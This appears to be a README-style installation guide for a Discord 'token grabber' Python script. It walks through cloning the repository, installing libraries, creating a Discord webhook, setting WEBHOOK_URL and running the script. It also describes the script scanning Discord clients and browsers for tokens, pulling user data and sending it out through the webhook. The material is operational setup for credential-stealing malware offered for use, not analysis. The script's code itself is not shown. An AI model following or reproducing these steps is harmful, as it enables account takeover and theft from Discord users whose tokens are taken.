🔧 Installation
📋 What You Need Before Starting
✅ Item	ℹ️ Description
🐍 Python 3.8+	Installed on your computer
🎮 Discord Account	A server or channel you control
🔗 Discord Webhook URL	Created from your Discord server settings
🖥️ Command Line	Basic knowledge of terminal/command prompt
📦 pip	Python package manager
📥 Step 1: Get the Code
Open your terminal/command prompt and run:

bash


git clone https://github.com/your-repo/token-grabber.git
cd token-grabber
💡 Tip: If you don't have Git installed, download the ZIP file from GitHub and extract it.

📦 Step 2: Install Required Python Libraries
bash


pip install requests
pip install discord-webhook
Or install both at once:

bash


pip install requests discord-webhook
🔗 Step 3: Create a Discord Webhook
#	Action
1️⃣	Open Discord and go to your server/channel
2️⃣	Click the gear icon (Server Settings)
3️⃣	Click on "Integrations" in the sidebar
4️⃣	Click on "Webhooks"
5️⃣	Click "New Webhook"
6️⃣	Give it a name (e.g., "Token Grabber")
7️⃣	Click "Copy Webhook URL"
⚠️ Warning: Keep your webhook URL secret! Anyone with it can receive your logs.

⚙️ Step 4: Configure the Script
Open the script (e.g., token_grabber.py) in a text editor and set:

python


WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"  # 🔴 REQUIRED
🚀 Step 5: Run the Script
bash


python token_grabber.py
You should see the script:

🔍 Scanning for Discord tokens in all clients and browsers
🌐 Querying Discord API for user data
📨 Sending data via your webhook
💾 Saving all data into tokens.json
